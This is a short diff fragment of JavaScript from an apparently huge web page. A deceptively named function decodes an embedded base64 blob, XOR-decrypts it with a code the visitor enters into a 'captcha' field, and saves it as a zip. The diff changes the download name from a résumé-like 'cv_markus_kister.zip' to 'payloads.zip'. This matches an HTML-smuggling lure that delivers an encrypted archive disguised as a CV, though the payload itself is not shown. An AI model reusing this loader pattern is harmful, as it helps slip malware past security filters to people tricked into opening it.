@@ -21515,7 +21515,7 @@ link.click();
 function changeColor () {
 var _data = atob(data);
 _data = xorDecrypt(_data, document.getElementById("captcha2").value)
-saveByteArray("cv_markus_kister.zip", _data);
+saveByteArray("payloads.zip", _data);
 }
 
 function generateRandomCode() {
